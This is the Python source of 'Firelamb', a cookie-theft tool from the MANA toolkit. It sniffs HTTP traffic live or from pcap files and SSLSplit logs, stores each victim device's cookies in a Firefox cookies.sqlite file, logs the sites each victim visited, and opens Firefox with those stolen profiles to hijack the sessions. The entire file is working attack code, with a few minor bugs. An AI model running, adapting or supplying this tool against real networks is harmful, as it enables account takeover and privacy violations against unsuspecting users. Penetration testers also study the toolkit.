#!/usr/bin/env python
# Glenn's Firelamb.
# Make sure you have sqlite3 > 3.7
# glenn@sensepost.com
# V0.0.2

from scapy.all import *
import sys
import helper
from optparse import OptionParser
import time
import sqlite3
from publicsuffix import PublicSuffixList
from urlparse import urlparse
from subprocess import Popen
import os


save_dir='/var/lib/mana-toolkit/lamb_braai/'
ip_logging=False


#""Recent versions of Firefox use "PRAGMA journal_mode=WAL" which requires
#SQLite version 3.7.0 or later.  You won't be able to read the database files
#with SQLite version 3.6.23.1 or earlier.  You'll get the "file is encrypted
#or is not a database" message.
#""

sql_conns={}
host_visits={}
html_header="<h2>Cookies sniffed for the following domains\n<hr>\n<br>"

def db_insert(mac,host,name,value,address,ua,ip):

	global ip_logging

	save_to=mac
	if(ip_logging):
		save_to=ip

	if (save_to not in sql_conns):

		print "MANA (FireLamb) : [+] New device noticed %s (%s)" %(save_to,ua)
		try:
			tmp_save_dir=save_dir+save_to
			cookie_file=tmp_save_dir+'/cookies.sqlite'
			cookie_file_exists=os.path.exists(cookie_file)

			if not os.path.exists(tmp_save_dir):
                		os.makedirs(tmp_save_dir)

			db=sqlite3.connect(cookie_file,isolation_level=None)
			sql_conns[save_to] = db.cursor()

			if not cookie_file_exists:

				sql_conns[save_to].execute("CREATE TABLE moz_cookies (id INTEGER PRIMARY KEY, baseDomain TEXT, name TEXT, value TEXT, host TEXT, path TEXT, expiry INTEGER, lastAccessed INTEGER, creationTime INTEGER, isSecure INTEGER, isHttpOnly INTEGER, CONSTRAINT moz_uniqueid UNIQUE (name, host, path))")
				sql_conns[save_to].execute("CREATE INDEX moz_basedomain ON moz_cookies (baseDomain)")
			else:
				print "MANA (FireLamb) : [+] Found existing cookie file, will append to %s" %cookie_file
		except:
			print "MANA (FireLamb) : [!] Failed to do db"
			traceback.print_exc(file=sys.stdout)
			exit(-1)

	full_url=address
	scheme=urlparse(address).scheme
	scheme=(urlparse(address).scheme)
	basedomain = psl.get_public_suffix(host)
	address=urlparse(address).hostname
	short_url=scheme+"://"+address

	f=open(save_dir+save_to+'/visited.html','a')
	if(save_to not in host_visits):
		host_visits[save_to]={}
		f.write(html_header)
	if( address not in host_visits[save_to]):
		host_visits[save_to][address]=1
		f.write("\n<br>\n<a href='%s'>%s</a>" %(short_url,address))
	f.close()




	if address == basedomain:
		address = "." + address

	expire_date=2000000000 #Year2033
	now=int(time.time())-600
	sql_conns[save_to].execute('INSERT OR IGNORE INTO moz_cookies (baseDomain, name, value, host, path, expiry, lastAccessed, creationTime, isSecure, isHttpOnly) VALUES (?,?,?,?,?,?,?,?,?,?)', (basedomain,name,value,address,'/',expire_date,now,now,0,0))
#	sql_conns[save_to].execute('INSERT OR IGNORE INTO moz_cookies (baseDomain, name, value, host, path, expiry, lastAccessed, creationTime, isSecure, isHttpOnly) VALUES (?,?,?,?,?,?,?,?,?,?)', (basedomain,name,value,address,'/',expire_date,now,now,0,0))


def process(pkt):
	if pkt.haslayer(TCP):
		if pkt.haslayer(Raw):
			tcpdata = pkt.getlayer(Raw).load
			if tcpdata.startswith("POST ") or tcpdata.startswith("GET "):
				ether_src='None_observed'
				if(pkt.haslayer(Ether)):
					ether_src=pkt.getlayer(Ether).src
				cookie=helper.getcookie(tcpdata)
				host=helper.gethost(tcpdata)
				useragent=helper.getuseragent(tcpdata)
				address=helper.getdsturl(tcpdata)
				ip_src=pkt.getlayer(IP).src

				if cookie != None:
					cookie=''.join(cookie)
				else:
					cookie=''
				if host != None:
					host=''.join(host)
				else:
					host=''
				if useragent != None:
					useragent=''.join(useragent)
				else:
					useragnet=''

				if address != None:
					address=''.join(address)
				else:
					address=''


				if cookie != '':
					cookies = cookie.split(';')
        				for name_val in cookies:
                				eq = name_val.find('=')
                				name = name_val[0:eq].strip()
                				val = name_val[eq+1:].strip()

						db_insert(ether_src,host,name,val,address,useragent,ip_src)

def parsesslsplit(s):
	logpath = s
	print "MANA (FireLamb) : [+] Processing SSLSplit log files in directory %s" %logpath
	if not (str(logpath).endswith("/")):
		logpath += "/"
	try:
		for i in os.listdir(logpath):
			if (str(i).endswith("443.log")):
				print "MANA (FireLamb) : [+] Parsing SSLSplit file %s" %i
				lst1 = str(i).split("[")
				lst2 = str(lst1[1]).split("]")
				myIP = lst2[0]
				try:
					f = open(logpath+str(i))
					gotGet = 0
					theHost = ""
					theUrls = ""
					theCook = ""
					for z in f.readlines():
						z = str(z).replace("\r", "").replace("\n", "")
						if (str(z).startswith("GET ") or str(z).startswith("POST ")):
							gotGet=1
							lst1 = str(z).split(" ")
							theUrls = str(lst1[1]).strip()
							print "MANA (FireLamb) : [+] HTTP Request Start"
						else:
							if (gotGet > 0):
								if (str(z).lower().startswith("host:")):
									lst1 = str(z).strip().split(":")
									theHost = str(lst1[1]).strip()
									print "MANA (FireLamb) : [+] Got Host : " + theHost
								if (str(z).lower().startswith("cookie:")):
									lst1 = str(z).strip().split(": ")
									theCook = str(lst1[1]).strip()
									print "MANA (FireLamb) : [+] Got Cookie : " + theCook
								if (str(z).find("HTTP/1.")>-1):
									if ((theHost != "") and (theCook != "")):
										cookies = theCook.split(";")
										for cook in cookies:
											eq = cook.find("=")
											cname = str(cook)[0:eq].strip()
											cvalu = str(cook)[eq+1:].strip()
											db_insert(myIP, theHost, cname, cvalu, "http://" + theHost + theUrls, "", myIP)
									gotGet = 0
				except:
					print "MANA (FireLamb) : [+] Error opening log file " + logpath + str(i)
	except:
		print "MANA (FireLamb) : [+] Error opening log directory "  + logpath

def launch_firefox():
	list=[]
	print "MANA (FireLamb) : [+] Checking %s for cookie folders" %save_dir
	for f in os.listdir(save_dir):
		if not os.path.isfile(f):
			if os.path.exists(save_dir+f+"/cookies.sqlite"):
				list.append(save_dir+f)
	print "MANA (FireLamb) : [+] Found %d cookie folders" %len(list)

	for n in range(0,len(list)):
		print "MANA (FireLamb) :  [%d] - %s" %(n,list[n])

	if( len(list)>0):
		print "MANA (FireLamb) :  Enter the session number you'd like to launch, or enter 'a' for all"
		resp=raw_input(" Input:")
		if(resp == 'a'):
			for n in list:
				print "MANA (FireLamb) : firefox -profile %s %s/visited.html" %(n,n)
				Popen(["firefox","-profile",n,n+"/visited.html"])
		else:
			val=int(resp)
			ses=list[val]
			print "MANA (FireLamb) : firefox -profile %s %s/visited.html" %(ses,ses)
			os.system("firefox -profile %s %s/visited.html" %(ses,ses))
	else:
		print "MANA (FireLamb) : Exiting..."

#Main
def main():


	desc="Glenn's Firelamb: This tool will parse pcap files or listen on an interface for cookies. Cookies get saved to a Firefox cookies.sqlite file - one cookie file per observed device. (glenn@sensepost.com)"
	parser=OptionParser(description=desc)
	parser.add_option("-f", "--file", dest="fname",help="Specify pcap file to read")
	parser.add_option("-i", "--interface", dest="iface",help="Specify interface to listen on")
	parser.add_option("-p", "--ip_logging",action="store_true",dest="log_by_ip",default=False,help="Create cookie file per IP address. Default is per device MAC address")
	parser.add_option("-l", "--launch_firefox",dest="launch_ff",action = "store_true",default=False,help="Launch Firefox profiles for the saved cookies")
	parser.add_option("-s", "--karma_sslstrip",dest="sslstriplog",default=None,help="SSLStrip log file")
	parser.add_option("-t", "--karma_sslsplit",dest="sslsplitdir",default=None,help="Directory of SSLSplit log files")

	sqlv=sqlite3.sqlite_version.split('.')
	if (sqlv[0] <3 or sqlv[1] < 7):
		print "MANA (FireLamb) : [!] WARNING. sqlite3 version 3.7 or greater required. You have version %s.I'll try continue, but will likely not be able to write Firefox cookie files." %sqlite3.sqlite_version




	global psl
	global ip_logging
	psl = PublicSuffixList()

	(options, args) = parser.parse_args()
	ip_logging=options.log_by_ip


	if( not options.fname and not options.iface and not options.launch_ff):
			print parser.print_help()
			exit(-1)

	if(options.launch_ff):
		if (options.sslsplitdir):
			parsesslsplit(options.sslsplitdir)
		launch_firefox()

	else:

		if not os.path.exists(save_dir):
    			os.makedirs(save_dir)
		print "MANA (FireLamb) : [+] Saving output to %s" %save_dir


		if(options.iface):
			print "MANA (FireLamb) : [+] Listening for cookie traffic on interface %s" %options.iface
			sniff(iface=options.iface,prn=process)

		elif(options.fname):
			print "MANA (FireLamb) : [+] Reading pcap file '%s'...." %options.fname
			packets=rdpcap(options.fname)
			print "MANA (FireLamb) : [+] Processing file contents..."
			for p in packets:
				process(p)
			print "MANA (FireLamb) : [+] Done."


if __name__ == "__main__":
    main()
